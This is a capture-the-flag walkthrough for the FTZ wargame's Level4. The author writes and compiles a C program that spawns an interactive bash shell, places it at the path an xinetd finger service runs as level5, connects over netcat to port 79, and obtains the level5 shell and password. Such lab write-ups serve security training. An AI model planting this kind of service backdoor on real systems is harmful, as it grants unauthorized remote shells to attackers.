# Level4

## This level's goal

- xinetd
- Remote backdoor

***
```
[level4@ftz level4]$ cat hint

누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
(Someone planted a backdoor in /etc/xinetd.d/)
```

```
[level4@ftz tmp]$ ls -al /etc/xinetd.d | grep level4
-r--r--r--    1 root     level4        171 Aug 19  2014 backdoor
```

```
[level4@ftz level4]$ cat /etc/xinetd.d/backdoor
service finger
{
        disable = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = level5
        server          = /home/level4/tmp/backdoor
        log_on_failure  += USERID
}
```

```
[level4@ftz level4]$ cat /etc/services | grep finger
finger          79/tcp
finger          79/udp
cfinger         2003/tcp                        # GNU Finger
```

```
[level4@ftz level4]$ netstat -an | grep :79
tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN
```

```
[level4@ftz level4]$ ls -l /home/level4/tmp/backdoor
ls: /home/level4/tmp/backdoor: No such file or directory
```

There is no backdoor file, so you need to make a backdoor that you can exploit

```
[level4@ftz tmp]$ cat backdoor.c
#include <stdlib.h>

int main()
{
        system("/bin/bash -i");
        return 0;
}
[level4@ftz tmp]$ gcc -o backdoor backdoor.c
[level4@ftz tmp]$ chmod 777 backdoor
```

```
[level4@ftz tmp]$ finger level4@localhost
/bin/bash: line 1: level4
: command not found
id
my-pass
```

This is not working, cuz this level's concept is remote backdoor.

so you need to use nc(netcat) or telnet command in remote

```
┌──(root💀kali)-[~]
└─# nc 192.168.10.240 79
bash: no job control in this shell
stty: standard input: Invalid argument
[level5@ftz /]$ id
uid=3005(level5) gid=3005(level5)
[level5@ftz /]$ my-pass

Level5 Password is "what is your name?".
```
